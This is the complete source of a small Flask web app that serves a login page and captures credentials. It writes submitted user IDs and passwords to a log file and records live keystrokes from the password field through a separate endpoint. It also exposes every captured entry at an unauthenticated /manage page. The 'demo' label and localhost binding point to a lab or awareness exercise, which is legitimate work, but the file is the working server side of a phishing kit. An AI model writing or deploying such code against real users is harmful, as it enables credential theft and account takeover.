from flask import Flask, request, render_template, jsonify
from pathlib import Path

app = Flask(__name__, template_folder="templates")
CAPTURE_DIR = Path(__file__).parent / "captured"
CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
CREDS = CAPTURE_DIR / "credentials.log"
KEYS  = CAPTURE_DIR / "keystrokes.log"

@app.get("/")
def index():
    return render_template("login.html")

@app.post("/login")
def login():
    userid = request.form.get("userid","")
    password = request.form.get("password","")
    with CREDS.open("a", encoding="utf-8") as f:
        f.write(f"[Submit] {userid} : {password}\n")
    
    return "Thanks for logging in (demo)."

@app.post("/log_keystroke")
def log_keystroke():
    data = request.get_json(force=True, silent=True) or {}
    uid = data.get("userid","")
    pw = data.get("password","")
    with KEYS.open("a", encoding="utf-8") as f:
        f.write(f"[Typing] Username: {uid} | Password: {pw}\n")
    return jsonify(status="ok")

@app.get("/manage")
def manage():
    creds = CREDS.read_text(encoding="utf-8") if CREDS.exists() else "No credentials captured."
    keys  = KEYS.read_text(encoding="utf-8") if KEYS.exists() else "No keystrokes captured."
    return f"<pre>{creds}\n\n--- Keystroke Log ---\n\n{keys}</pre>"

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5002, debug=False)
